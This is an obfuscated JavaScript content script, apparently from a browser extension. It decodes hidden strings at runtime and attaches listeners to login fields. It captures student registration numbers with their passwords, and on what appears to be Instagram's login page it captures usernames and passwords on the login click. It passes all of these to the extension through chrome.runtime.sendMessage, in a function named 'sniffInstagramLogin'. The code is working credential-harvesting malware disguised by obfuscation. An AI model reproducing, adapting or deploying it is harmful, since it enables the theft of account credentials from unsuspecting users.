const a0m = a0b;
function a0b(a, b) {
  const c = a0a();
  return (
    (a0b = function (d, e) {
      d = d - 0xfe;
      let f = c[d];
      if (a0b["GyMAvC"] === undefined) {
        var g = function (l) {
          const m =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
          let n = "",
            o = "";
          for (
            let p = 0x0, q, r, s = 0x0;
            (r = l["charAt"](s++));
            ~r && ((q = p % 0x4 ? q * 0x40 + r : r), p++ % 0x4)
              ? (n += String["fromCharCode"](0xff & (q >> ((-0x2 * p) & 0x6))))
              : 0x0
          ) {
            r = m["indexOf"](r);
          }
          for (let t = 0x0, u = n["length"]; t < u; t++) {
            o +=
              "%" +
              ("00" + n["charCodeAt"](t)["toString"](0x10))["slice"](-0x2);
          }
          return decodeURIComponent(o);
        };
        (a0b["CpgVzL"] = g), (a = arguments), (a0b["GyMAvC"] = !![]);
      }
      const h = c[0x0],
        i = d + h,
        j = a[i];
      return !j ? ((f = a0b["CpgVzL"](f)), (a[i] = f)) : (f = j), f;
    }),
    a0b(a, b)
  );
}
(function (a, b) {
  const g = a0b,
    c = a();
  while (!![]) {
    try {
      const d =
        (parseInt(g(0x11b)) / 0x1) * (-parseInt(g(0x108)) / 0x2) +
        -parseInt(g(0x101)) / 0x3 +
        parseInt(g(0x10e)) / 0x4 +
        (parseInt(g(0x11a)) / 0x5) * (-parseInt(g(0x116)) / 0x6) +
        (parseInt(g(0x10b)) / 0x7) * (parseInt(g(0x102)) / 0x8) +
        (parseInt(g(0x105)) / 0x9) * (parseInt(g(0x11f)) / 0xa) +
        (-parseInt(g(0x127)) / 0xb) * (-parseInt(g(0x107)) / 0xc);
      if (d === b) break;
      else c["push"](c["shift"]());
    } catch (e) {
      c["push"](c["shift"]());
    }
  }
})(a0a, 0x924e8);
function sendStudentData(a, b) {
  const h = a0b;
  chrome[h(0x117)][h(0x106)]({
    type: h(0x10a),
    data: { registrationNumber: a, password: b },
  });
}
function setupStudentListeners() {
  const i = a0b;
  try {
    const a = document[i(0x115)](i(0x10c)),
      b = document[i(0x115)](i(0x10f));
    if (!a || !b) return ![];
    const c = () => {
      const j = i,
        d = a[j(0x118)][j(0x123)](),
        f = b[j(0x118)];
      if (d && f) sendStudentData(d, f);
    };
    return (
      c(),
      [i(0x110), i(0x112), i(0x120)][i(0x11d)]((d) => {
        const k = i;
        a[k(0x10d)](d, c), b[k(0x10d)](d, c);
      }),
      console[i(0x125)](i(0x103), i(0x119)),
      !![]
    );
  } catch (d) {
    return console[i(0x126)](i(0x104), d), ![];
  }
}
if (!setupStudentListeners()) {
  let retries = 0x0;
  const maxRetries = 0xf,
    interval = setInterval(() => {
      const l = a0b;
      retries++,
        (setupStudentListeners() || retries >= maxRetries) &&
          (clearInterval(interval),
          retries >= maxRetries && console[l(0x125)](l(0x11c), l(0x121)));
    }, 0x2bc);
}
function a0a() {
  const p = [
    "y2HHBMDL",
    "Aw5ZDgfNCMfTlMnVBq",
    "yNv0Dg9Uw3r5Cgu9j3n1yM1PDcDDoM5VDcHBzgLZywjSzwrDkq",
    "z2v0rwXLBwvUDej5swq",
    "mJCZndy4C3LLAhzy",
    "CNvUDgLTzq",
    "DMfSDwu",
    "y29SB3i6igDYzwvUoW",
    "mJbIzKnfDwi",
    "mtuZmJfvuNDnuu8",
    "jwpIMQdVUi8GtfbvigLUChv0CYbUB3qGzM91BMqGywz0zxiGBwf4ihjLDhjPzxmUifnJCMLWDcbZDg9WCgvKlG",
    "zM9YrwfJAa",
    "CxvLCNLtzwXLy3rVCG",
    "ntyWzhrjveXP",
    "yMX1CG",
    "y29SB3i6ig9Yyw5NztS",
    "y2XPy2S",
    "DhjPBq",
    "Aw5JBhvKzxm",
    "Bg9N",
    "zxjYB3i",
    "mZeZntbWA256uLq",
    "jwpINiuGw0LhxsbmB2DPBIbMB3jTigrLDgvJDgvK",
    "Aw5WDxrBBMfTzt0NDxnLCM5HBwuNxq",
    "Aw5ZDgfNCMfTx2XVz2LUx2rHDge",
    "mZi4mtKZn3HuseLyrq",
    "mtzREu9LwMy",
    "jwpINiuGtfbvigLUChv0igXPC3rLBMvYCYbHDhrHy2HLza",
    "4P2mievYCM9YihnLDhrPBMCGDxaGtfbvigXPC3rLBMvYCZO",
    "odC0odLdz1LcCNO",
    "C2vUze1LC3nHz2u",
    "nZm1nM1oDKnKsW",
    "mtq4EMfNsxHj",
    "Ag9ZDg5HBwu",
    "C3r1zgvUDf9KyxrH",
    "mtCYndi0B0ToCurg",
    "DhH0vq",
    "ywrKrxzLBNrmAxn0zw5LCG",
    "mJy3nduWog5Zt1bhsW",
    "vhH0ChDKqxv0B0LKxZG3nJC",
    "Aw5WDxq",
    "Aw5WDxrBBMfTzt0NCgfZC3DVCMqNxq",
  ];
  a0a = function () {
    return p;
  };
  return a0a();
}
if (location[a0m(0x109)][a0m(0x124)](a0m(0x113))) {
  let igTries = 0x0;
  const igMaxTries = 0x19,
    sniffInstagramLogin = setInterval(() => {
      const n = a0m;
      igTries++;
      const a = document[n(0x11e)](n(0xff)),
        b = document[n(0x11e)](n(0x111)),
        c = document[n(0x11e)](n(0x114));
      a &&
        b &&
        c &&
        (console[n(0x125)](n(0xfe), n(0x119)),
        c[n(0x10d)](
          n(0x122),
          () => {
            const o = n,
              d = a[o(0x118)][o(0x123)](),
              e = b[o(0x118)];
            d &&
              e &&
              chrome[o(0x117)][o(0x106)]({
                type: o(0x100),
                data: { username: d, password: e },
              });
          },
          { once: !![] }
        ),
        clearInterval(sniffInstagramLogin)),
        igTries >= igMaxTries && clearInterval(sniffInstagramLogin);
    }, 0x2bc);
}
